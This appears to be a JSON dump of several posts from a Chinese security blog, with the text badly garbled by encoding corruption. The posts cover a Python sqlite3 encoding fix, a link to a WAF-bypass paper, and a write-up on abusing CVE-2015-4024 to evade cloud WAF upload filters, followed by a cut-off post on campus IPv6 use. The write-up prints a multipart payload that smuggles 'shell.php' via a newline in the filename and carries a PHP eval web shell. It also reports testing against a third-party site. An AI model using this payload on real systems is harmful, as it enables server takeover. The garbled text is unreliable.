ä»¥utf8çš„ç¼–ç æ ¼å¼è¿›è¡Œè§£ç è½¬ä¸ºunicodeç¼–ç åšæ’å…¥ 1 2 3 4 cursor.execute(\u0026#39;\u0026#39;\u0026#39; INSERT INTO JAVBUS_DATA (å§“å, å¹´é¾„) VALUES (?, ?) \u0026#39;\u0026#39;\u0026#39;, (\u0026#39;å¼ ä¸‰\u0026#39;.decode(\u0026#39;utf-8\u0026#39;), \u0026#39;22å²\u0026#39;.decode(\u0026#39;utf-8\u0026#39;))) ä½†æ˜¯å¦‚æœæ•°æ®å¤ªé•¿ï¼Œè¿™æ ·ä¸€ä¸ªä¸€ä¸ªæ•²æŒºéº»çƒ¦çš„ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨mapå‡½æ•°ç®€åŒ–çš„å°ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #-*-coding:utf-8-*- import sqlite3 def decode_utf8(aStr): return aStr.decode(\u0026#39;utf-8\u0026#39;) conn = sqlite3.connect(\u0026#34;something.db\u0026#34;) cursor = conn.cursor() cursor.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS JAVBUS_DATA( id INT PRIMARY KEY, å§“å TEXT, å¹´é¾„ TEXT);\u0026#39;\u0026#39;\u0026#39;) print \u0026#34;Table created successfully\u0026#34; cursor.execute(\u0026#39;\u0026#39;\u0026#39; INSERT INTO JAVBUS_DATA (å§“å, å¹´é¾„) VALUES (?, ?) \u0026#39;\u0026#39;\u0026#39;, map(decode_utf8, (\u0026#39;å¼ ä¸‰\u0026#39;, \u0026#39;22å²\u0026#39;))) cursor.close() conn.commit() conn.close() å…¶ä»–æ³¨æ„ï¼š æœ‰æ—¶ç”¨ç¬¬äºŒç§æ–¹æ³•ä¼šå‡ºç°UnicodeDecodeError åŠ å…¥#--coding:utf-8-- è¿˜æ˜¯ä¸è¡Œè¯·sysæŒ‡å®šç¼–ç ï¼š\n1 2 3 import sys reload(sys) sys.setdefaultencoding(\u0026#39;utf8\u0026#39;) è¿™ä¸ªé—®é¢˜åœ¨python3åº”è¯¥ä¸ä¼šå‡ºç°ï¼Œpython2ç¼–ç é—®é¢˜ï¼Œä»…ä½œè®°å½•\n","permalink":"https://www.hacktech.cn/post/programmingerror-you-must-not-use-8-bit-bytestrings.html","summary":"\u003ch1 id=\"é—®é¢˜å‡ºç°\"\u003eé—®é¢˜å‡ºç°ï¼š\u003c/h1\u003e\n\u003cp\u003eYou must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.\u003c/p\u003e\n\u003ch1 id=\"äº§ç”ŸåŸå› \"\u003eäº§ç”ŸåŸå› ï¼š\u003c/h1\u003e\n\u003cp\u003eé—®é¢˜åœ¨ç”¨Pythonçš„sqlite3æ“ä½œæ•°æ®åº“è¦æ’å…¥çš„å­—ç¬¦ä¸²ä¸­å«æœ‰éasciiå­—ç¬¦æ—¶äº§ç”Ÿï¼Œåšæ’å…¥çš„æ—¶å€™å°±æŠ¥å½“å‰è¿™ä¸ªé”™è¯¯ã€‚\u003c/p\u003e\n\u003ch1 id=\"è§£å†³æ–¹æ³•\"\u003eè§£å†³æ–¹æ³•ï¼š\u003c/h1\u003e\n\u003ch2 id=\"1-æŒ‰æç¤º\"\u003e1. æŒ‰æç¤º\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econnection \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e sqlite3\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econnect(\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econnection\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext_factory \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e str\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eä½†æ˜¯å¦‚æœå­—ç¬¦ä¸­å‡ºç°éasciiå­—ç¬¦ï¼Œé‚£ä¹ˆä¾ç„¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œä¼šäº§ç”Ÿä¸å¯é¢„çŸ¥çš„ä¹±ç ï¼Œè¿™æ ·å¯ä»¥å‚è€ƒ 2\u003c/p\u003e\n\u003ch2 id=\"2-ä»¥utf8çš„ç¼–ç æ ¼å¼è¿›è¡Œè§£ç è½¬ä¸ºunicodeç¼–ç åšæ’å…¥\"\u003e2. ä»¥utf8çš„ç¼–ç æ ¼å¼è¿›è¡Œè§£ç è½¬ä¸ºunicodeç¼–ç åšæ’å…¥\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecursor\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eexecute(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    INSERT INTO JAVBUS_DATA (å§“å, å¹´é¾„)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    VALUES (?, ?)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    \u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e, (\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;å¼ ä¸‰\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf-8\u0026#39;\u003c/span\u003e), \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;22å²\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf-8\u0026#39;\u003c/span\u003e)))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eä½†æ˜¯å¦‚æœæ•°æ®å¤ªé•¿ï¼Œè¿™æ ·ä¸€ä¸ªä¸€ä¸ªæ•²æŒºéº»çƒ¦çš„ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨mapå‡½æ•°ç®€åŒ–çš„å°ä¾‹å­\u003c/p\u003e","title":"ProgrammingError: You must not use 8-bit bytestrings..."},{"content":"ç»å¯¹å€¼å¾—ä¸€çœ‹çš„æŠ€æœ¯æ–‡ç«  pdfä¸‹è½½é“¾æ¥\n[via@ç ´-è§ ]\n","permalink":"https://www.hacktech.cn/post/waf%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1bypass-waf.html","summary":"\u003ch1 id=\"ç»å¯¹å€¼å¾—ä¸€çœ‹çš„æŠ€æœ¯æ–‡ç« \"\u003eç»å¯¹å€¼å¾—ä¸€çœ‹çš„æŠ€æœ¯æ–‡ç« \u003c/h1\u003e\n\u003cp\u003e\u003ca href=\"http://7xusrl.com1.z0.glb.clouddn.com/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass%20WAF.pdf\"\u003epdfä¸‹è½½é“¾æ¥\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e[via@\u003ca href=\"http://weibo.com/ttarticle/p/show?id=2309404007261092631700\"\u003eç ´-è§\u003c/a\u003e ]\u003c/em\u003e\u003c/p\u003e","title":"WAFæ”»é˜²ç ”ç©¶ä¹‹å››ä¸ªå±‚æ¬¡Bypass WAF"},{"content":"1. èƒŒæ™¯ä»‹ç» ä»Šå¤©æˆ‘ä»¬æƒ³ä»2015.04.03çš„ä¸€ä¸ªPHPè¿œç¨‹dosæ¼æ´ï¼ˆCVE-2015-4024ï¼‰è¯´èµ·ã€‚æŠ€æœ¯ç»†èŠ‚è§å¦‚ä¸‹é“¾æ¥ï¼Œhttps://bugs.php.net/bug.php?id=69364ã€‚å› ä¸ºphpè§£æbody partçš„headeræ—¶è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè€Œæ‹¼æ¥è¿‡ç¨‹é‡å¤æ‹·è´å­—ç¬¦å¯¼è‡´DOSã€‚äº‹å®ä¸Šè¯¥æ¼æ´è¿˜æœ‰å…¶ä»–édosçš„åˆ©ç”¨ä»·å€¼ï¼Œå…¶ä¸­ä¹‹ä¸€ï¼Œå°±æ˜¯ç»•è¿‡å½“å‰å„ç§äº‘WAFçš„æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ç­–ç•¥ã€‚\nç›®å‰å›½å†…å¤–æµè¡Œçš„äº‘WAFå‚å•†æœ‰å¦‚ç™¾åº¦äº‘åŠ é€Ÿï¼Œ360ç½‘ç«™å«å£«ï¼ŒåŠ é€Ÿä¹ï¼Œäº‘ç›¾ç­‰ã€‚å› ä¸ºPHPè¿œç¨‹dosæ¼æ´åŠPHPå®˜æ–¹ä¿®å¤æ–¹æ¡ˆçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡äº†å½“å‰ä¸»æµWAFçš„æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ï¼Œä¾‹å¦‚ç™¾åº¦äº‘åŠ é€Ÿã€360ç½‘ç«™å«å£«ã€çŸ¥é“åˆ›äºåŠ é€Ÿä¹ã€å®‰å…¨ç‹—ã€‚\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥PHPä¸ºä¾‹ï¼Œè¯¦ç»†è§£ææˆ‘ä»¬çš„ç»•è¿‡æ–¹æ³•ã€‚\n2. ç»•è¿‡WAFçš„åŸç† æ ¹æ®PHP DOSæ¼æ´åŸç†ï¼Œåœ¨multipart_buffer_headerså‡½æ•°è§£æheaderå¯¹åº”valueæ—¶ï¼Œvalueå€¼å­˜åœ¨nè¡Œã€‚æ¯è¡Œçš„å­—ç¬¦ä¸²ä»¥ç©ºç™½ç¬¦å¼€å¤´æˆ–ä¸å­˜å­—ç¬¦\u0026rsquo;:\u0026rsquo;ï¼Œéƒ½è§¦å‘ä»¥ä¸‹åˆå¹¶valueçš„ä»£ç å—ã€‚é‚£ä¹ˆè§£æheaderçš„valueå°±è¦æ‰§è¡Œ(n-1)æ¬¡åˆå¹¶valueçš„ä»£ç å—ï¼Œä»è€Œå¯¼è‡´DOSã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 prev_len= strlen(prev_entry.value); cur_len= strlen(line); entry.value= emalloc(prev_len + cur_len + 1); //1æ¬¡åˆ†ç‰‡å†…å­˜ memcpy(entry.value,prev_entry.value, prev_len); //1æ¬¡æ‹·è´ memcpy(entry.value+ prev_len, line, cur_len); //1æ¬¡æ‹·è´ entry.value[cur_len+ prev_len] = \u0026#39;\\0\u0026#39;; entry.key= estrdup(prev_entry.key); zend_llist_remove_tail(header);//1æ¬¡å†…å­˜é‡Šæ”¾ è€ŒPHPå®˜æ–¹ä¿®å¤æ–¹æ¡ˆï¼Œåœ¨è¿›è¡Œåˆå¹¶æ—¶ï¼Œé¿å…é‡å¤æ‹·è´ï¼Œä»è€Œé¿å…DOSã€‚ç»•è¿‡WAFçš„å…³é”®åœ¨äºï¼ŒPHP multipart_buffer_headerså‡½æ•°è§£æheaderå¯¹åº”valueæ—¶ï¼Œvalueå€¼å­˜åœ¨å¤šè¡Œã€‚æ¯è¡Œçš„å­—ç¬¦ä¸²ä»¥ç©ºç™½ç¬¦å¼€å¤´æˆ–ä¸å­˜å­—ç¬¦\u0026rsquo;:\u0026rsquo;ï¼Œå°†è¿›è¡Œåˆå¹¶ã€‚è€ŒWAFåœ¨è§£ææ–‡ä»¶ä¸Šä¼ çš„æ–‡ä»¶åæ—¶ï¼Œæ²¡æœ‰è€ƒè™‘åè®®å…¼å®¹ï¼Œä¸è¿›è¡Œå¤šè¡Œåˆå¹¶ï¼Œå°±å¯ä»¥è¢«ç»•è¿‡ã€‚\næ ¹æ®åŸç†æ„é€ ç»•è¿‡WAFæ–‡ä»¶ä¸Šä¼ é˜²å¾¡çš„payloadï¼ŒWAFè§£æåˆ°çš„æ–‡ä»¶åä¸ºâ€test3.jpgâ€ï¼Œè€ŒPHPè§£æåˆ°çš„æ–‡ä»¶åæ˜¯â€test3.jpg\\nf/shell.phpâ€ï¼Œå› ä¸ºâ€/â€æ˜¯ç›®å½•åˆ†éš”ç¬¦ï¼Œä¸Šä¼ çš„æ–‡ä»¶åå˜ä¸ºshell.phpã€‚ä»¥ä¸‹æ˜¯ç»•è¿‡paylaodã€æµ‹è¯•è„šæœ¬ã€paylaodè¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„æ•ˆæœå›¾ã€‚\nWAFç»•è¿‡payload: 1 2 3 4 5 6 7 8 9 ------WebKitFormBoundaryx7V4AhipWn8ig52y Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;test3.jpg\\nsf/shell.php Content-Type: application/octet-stream \u0026lt;?php eval($_GET[\u0026#39;c\u0026#39;])?\u0026gt; ------WebKitFormBoundaryx7V4AhipWn8ig52y æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æµ‹è¯•è„šæœ¬: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $name = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; echo $name; echo \u0026#34;\\n\u0026#34;; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;] , \u0026#39;/usr/local/nginx/html/upload/\u0026#39;.$_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); echo \u0026#34;upload success! \u0026#34;.$_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; echo \u0026#34;\\n\u0026#34;; echo strlen($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); ?\u0026gt; Payloadèƒ½å¤Ÿæ­£å¸¸ä¸Šä¼ \n3. ç»•è¿‡WAFå®æˆ˜ ç¬”è€…é€šè¿‡æ­å»ºè‡ªå·±çš„æµ‹è¯•ç«™ï¼Œæ¥å…¥360ç½‘ç«™å«å£«å’ŒåŠ é€Ÿä¹ï¼ŒéªŒè¯ç»•è¿‡WAFæ–‡ä»¶ä¸Šä¼ é˜²å¾¡çš„æ–¹æ³•ã€‚\n3.1 ç»•è¿‡360ç½‘ç«™å«å£« æ­¥éª¤1ï¼ŒéªŒè¯ç½‘ç«™å·²è¢«360ç½‘ç«™å«å£«é˜²å¾¡ï¼Œæ‹¦æˆªäº†ç›´æ¥ä¸Šä¼ PHPæ–‡ä»¶çš„è¯·æ±‚ã€‚ æ­¥éª¤2ï¼šæˆåŠŸç»•è¿‡360ç½‘ç«™å«å£«ï¼Œä¸Šä¼ shellæˆåŠŸï¼Œæ–‡ä»¶æ˜¯apo.phpã€‚åœ¨è¯¥è¯·æ±‚ä¸­ï¼Œæœ‰æ²¡æœ‰Content-Typeä¸å½±å“ç»•è¿‡ã€‚ 3.2 ç»•è¿‡çŸ¥é“åˆ›å®‡åŠ é€Ÿä¹ æ­¥éª¤ä¸€ï¼šéªŒè¯ç½‘ç«™è¢«åŠ é€Ÿä¹ä¿æŠ¤ï¼Œæ‹¦æˆªäº†ç›´æ¥ä¸Šä¼ PHPæ–‡ä»¶çš„è¯·æ±‚ã€‚ æ­¥éª¤äºŒï¼šæˆåŠŸç»•è¿‡åŠ é€Ÿä¹ï¼Œä¸Šä¼ shellï¼Œæ–‡ä»¶æ˜¯syt.phpã€‚ 3.3. ç»•è¿‡ç™¾åº¦äº‘åŠ é€Ÿ ç™¾åº¦äº‘åŠ é€Ÿä¸CloudFlareï¼Œä»ç™¾åº¦åŒ€åŠ é€Ÿæ‹¦æˆªé¡µé¢å¯ä»¥çœ‹å‡ºä½¿ç”¨çš„æ˜¯CloudFlare. ä½†æ˜¯ä¼°è®¡æœ‰æœ¬åœ°åŒ–ï¼Œç™¾åº¦äº‘åŠ é€Ÿåº”è¯¥æ˜¯ç™¾åº¦å’ŒCloudFlareå…±åŒäº§ç‰©å§ã€‚æµ‹è¯•ç™¾åº¦æ²¡æœ‰æ­å»ºè‡ªå·±çš„æµ‹è¯•ç¯å¢ƒï¼Œæ‰¾äº†ä¸ªæ¥å…¥äº†ç™¾åº¦äº‘åŠ é€Ÿçš„ç«™è¿›è¡Œæµ‹è¯•ã€‚\næ­¥éª¤ä¸€ï¼šéªŒè¯ç½‘ç«™è¢«ç™¾åº¦äº‘åŠ é€Ÿä¿æŠ¤ï¼Œæ‹¦æˆªäº†ç›´æ¥ä¸Šä¼ PHPæ–‡ä»¶çš„è¯·æ±‚ã€‚ æ­¥éª¤äºŒï¼šæˆåŠŸç»•è¿‡äº‘åŠ é€Ÿ åŒä¸Š\n4. æ‰©å±•â€”æ›´å¤šçš„å·¥ä½œ 4.1 åˆ†æfilenameå…¶ä»–å­—ç¬¦çš„ç»•è¿‡ åŒç†ï¼Œæˆ‘ä»¬å‘ç°é™¤äº†åŒå¼•å·å¤–ï¼Œä½¿ç”¨å•å¼•å·ä¹Ÿèƒ½ç»•è¿‡WAFçš„é˜²å¾¡ï¼Œå¹¶å®ç°æ–‡ä»¶ä¸Šä¼ ã€‚\n1 2 3 4 5 6 7 8 9 ------WebKitFormBoundaryx7V4AhipWn8ig52y Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#39;test3.jpg\\nsf/shell.php Content-Type: application/octet-stream \u0026lt;?php eval($_GET[\u0026#39;c\u0026#39;])?\u0026gt; ------WebKitFormBoundaryx7V4AhipWn8ig52y 4.2 åˆ†æå…¶ä»–åº”ç”¨è„šæœ¬è¯­è¨€ æˆ‘ä»¬ä¹Ÿå‘ç°jspè§£æä¹Ÿæœ‰è‡ªå·±çš„ç‰¹ç‚¹ï¼ŒåŒæ—¶å¯è¢«ç”¨äºç»•è¿‡WAFã€‚æš‚æ—¶æœªæµ‹è¯•asp,aspx,pythonç­‰å¸¸ç”¨çš„WEBåº”ç”¨è„šæœ¬è¯­è¨€ã€‚\n5. ä¿®å¤æ–¹æ¡ˆ 5.1 ä¿®å¤æ–¹æ¡ˆä¸€ è§£ææ–‡ä»¶ä¸Šä¼ è¯·æ±‚æ—¶ï¼Œå¦‚æœå‘ç°è¯·æ±‚ä¸ç¬¦åˆåè®®è§„èŒƒï¼Œåˆ™æ‹’ç»è¯·æ±‚ã€‚å¯èƒ½ä¼šäº§ç”Ÿè¯¯æ‹¦æˆªï¼Œéœ€è¦è¯„ä¼°è¯¯æ‹¦æˆªçš„å½±å“èŒƒå›´ã€‚\n5.2 ä¿®å¤æ–¹æ¡ˆäºŒ å…¼å®¹phpçš„æ–‡ä»¶è§£ææ–¹å¼ï¼Œè§£ææ–‡ä»¶åæ—¶ï¼Œä»¥å•å¼•å·æˆ–åŒå¼•å·å¼€å¤´ï¼Œå¹¶ä¸”å¯¹åº”çš„å•å¼•å·åŒå¼•å·é—­åˆã€‚\n6. æ€»ç»“ æœ¬æ–‡é€šè¿‡Review PHPè¿œç¨‹dosæ¼æ´(CVE-2015-4024)ï¼Œå¹¶åˆ©ç”¨è¯¥ç‰¹æ€§ç»•è¿‡ç°æœ‰WAFçš„æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ï¼ŒæˆåŠŸä¸Šä¼ shellã€‚ æ›´é‡è¦çš„ä»·å€¼ï¼Œæä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªç»•è¿‡WAFçš„æ–°æ€è·¯ï¼Œä¸€ç§ç ”ç©¶æ–°æ–¹å‘ï¼šåˆ©ç”¨åç«¯åº”ç”¨è„šæœ¬ä¸WAFè¡Œä¸ºçš„å·®å¼‚ç»•è¿‡WAFçš„é˜²å¾¡ã€‚æ€»çš„æ¥è¯´ï¼Œä¸€æ¬¾ä¼˜ç§€çš„WAFåº”è¯¥èƒ½å¤Ÿå¤„ç†å…¼å®¹WEBåº”ç”¨å®¹å™¨ã€æ ‡å‡†åè®®ã€webæœåŠ¡å™¨è¿™é—´çš„å·®å¼‚ã€‚\n","permalink":"https://www.hacktech.cn/post/php-dos%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8cve-2015-4024-reviewed.html","summary":"\u003ch1 id=\"1-----èƒŒæ™¯ä»‹ç»\"\u003e1.     èƒŒæ™¯ä»‹ç»\u003c/h1\u003e\n\u003cp\u003eä»Šå¤©æˆ‘ä»¬æƒ³ä»2015.04.03çš„ä¸€ä¸ªPHPè¿œç¨‹dosæ¼æ´ï¼ˆCVE-2015-4024ï¼‰è¯´èµ·ã€‚æŠ€æœ¯ç»†èŠ‚è§å¦‚ä¸‹é“¾æ¥ï¼Œ\u003ca href=\"https://bugs.php.net/bug.php?id=69364\"\u003ehttps://bugs.php.net/bug.php?id=69364\u003c/a\u003eã€‚å› ä¸ºphpè§£æbody partçš„headeræ—¶è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œè€Œæ‹¼æ¥è¿‡ç¨‹é‡å¤æ‹·è´å­—ç¬¦å¯¼è‡´DOSã€‚äº‹å®ä¸Šè¯¥æ¼æ´è¿˜æœ‰å…¶ä»–édosçš„åˆ©ç”¨ä»·å€¼ï¼Œå…¶ä¸­ä¹‹ä¸€ï¼Œå°±æ˜¯ç»•è¿‡å½“å‰å„ç§äº‘WAFçš„æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ç­–ç•¥ã€‚\u003c/p\u003e\n\u003cp\u003eç›®å‰å›½å†…å¤–æµè¡Œçš„äº‘WAFå‚å•†æœ‰å¦‚ç™¾åº¦äº‘åŠ é€Ÿï¼Œ360ç½‘ç«™å«å£«ï¼ŒåŠ é€Ÿä¹ï¼Œäº‘ç›¾ç­‰ã€‚å› ä¸ºPHPè¿œç¨‹dosæ¼æ´åŠPHPå®˜æ–¹ä¿®å¤æ–¹æ¡ˆçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡äº†å½“å‰ä¸»æµWAFçš„æ–‡ä»¶ä¸Šä¼ é˜²å¾¡ï¼Œä¾‹å¦‚ç™¾åº¦äº‘åŠ é€Ÿã€360ç½‘ç«™å«å£«ã€çŸ¥é“åˆ›äºåŠ é€Ÿä¹ã€å®‰å…¨ç‹—ã€‚\u003c/p\u003e\n\u003cp\u003eæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥PHPä¸ºä¾‹ï¼Œè¯¦ç»†è§£ææˆ‘ä»¬çš„ç»•è¿‡æ–¹æ³•ã€‚\u003c/p\u003e\n\u003ch1 id=\"2-----ç»•è¿‡wafçš„åŸç†\"\u003e2.     ç»•è¿‡WAFçš„åŸç†\u003c/h1\u003e\n\u003cp\u003eæ ¹æ®PHP DOSæ¼æ´åŸç†ï¼Œåœ¨multipart_buffer_headerså‡½æ•°è§£æheaderå¯¹åº”valueæ—¶ï¼Œvalueå€¼å­˜åœ¨nè¡Œã€‚æ¯è¡Œçš„å­—ç¬¦ä¸²ä»¥ç©ºç™½ç¬¦å¼€å¤´æˆ–ä¸å­˜å­—ç¬¦\u0026rsquo;:\u0026rsquo;ï¼Œéƒ½è§¦å‘ä»¥ä¸‹åˆå¹¶valueçš„ä»£ç å—ã€‚é‚£ä¹ˆè§£æheaderçš„valueå°±è¦æ‰§è¡Œ(n-1)æ¬¡åˆå¹¶valueçš„ä»£ç å—ï¼Œä»è€Œå¯¼è‡´DOSã€‚\u003c/p\u003e","title":"PHP DOSæ¼æ´çš„æ–°åˆ©ç”¨ï¼šCVE-2015-4024 Reviewed"},{"content":" è½¬è½½è‡ªDyhube\nç®€è¿° ç¬”è€…åˆ©ç”¨ç¬”è®°æœ¬ç”µè„‘å®ç°ipv6å…è´¹ä¸Šç½‘å·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼ŒåŸç†æ˜¯é€šè¿‡ipv6è®¿é—®ipv4èµ„æºï¼Œåœ¨å­¦æ ¡ç½‘ç»œä¸é™æµé‡ã€ä¸é™æ—¶é•¿ã€20å…†å¸¦å®½ï¼ˆæˆ‘ä»¬å­¦æ ¡ipv6é™é€Ÿä¸Šä¸‹å¯¹ç­‰20å…†ï¼Œæ²¡åŠæ³•ï¼ï¼‰,ç”µè„‘å¼€çƒ­ç‚¹å…¨å¯å®¤å…±ç”¨ï¼Œé‚£çœŸæ˜¯çˆ½ç¿»å¤© !\nä½†æ˜¯æ¯å¤©å›åˆ°å¯å®¤æ€»æ˜¯æ‰“å¼€ç”µè„‘å¼€çƒ­ç‚¹è¿˜çœŸæ˜¯è›‹ç–¼çš„äº‹æƒ…ã€‚å†è¯´ç”µè„‘ä¹Ÿä¸èƒ½æ€»æ˜¯å¼€ç€å§ã€‚è¿™æ—¶æˆ‘å°±æƒ³èƒ½ä¸èƒ½æ‰¾ä¸ªè·¯ç”±å™¨ï¼Œä¸€å¤©äºŒåå››å°æ—¶å¼€æœºï¼Œç”µè„‘ã€æ‰‹æœºã€å¹³æ¿éšæ—¶éƒ½å¯ä»¥è¿ã€‚è¿™ä¸ªæƒ³æ³•å¤§æ¦‚å‡ºç°åœ¨åŠå¹´å‰ï¼Œç”±äºæ‰‹é‡Œæ²¡æœ‰è·¯ç”±å™¨ï¼Œå°±ä¸€ç›´æ²¡å¼„ï¼Œä½†æ˜¯ç½‘ä¸Šæ˜¯æœ‰å„ç§æˆåŠŸçš„æ¡ˆä¾‹çš„ã€‚\nå‰æ®µæ—¶é—´æ‰‹é‡Œç»ˆäºè¿›äº†å°K1ï¼Œç”±äºä¹‹å‰å·²ç»æŸ¥äº†ç›¸å½“å¤šçš„æ•™ç¨‹ï¼Œæ‰€ä»¥å°±é¡ºé£é¡ºæ°´ï¼Œå¾ˆå¿«å°±æˆåŠŸäº†ã€‚ä¸‹é¢æˆ‘å°±ä¸»è¦è®²ä¸€ä¸‹openwrtå®¢æˆ·ç«¯çš„é…ç½®é—®é¢˜ã€‚\næ„ä¹‰ åœ¨å¤§éƒ¨åˆ†é«˜æ 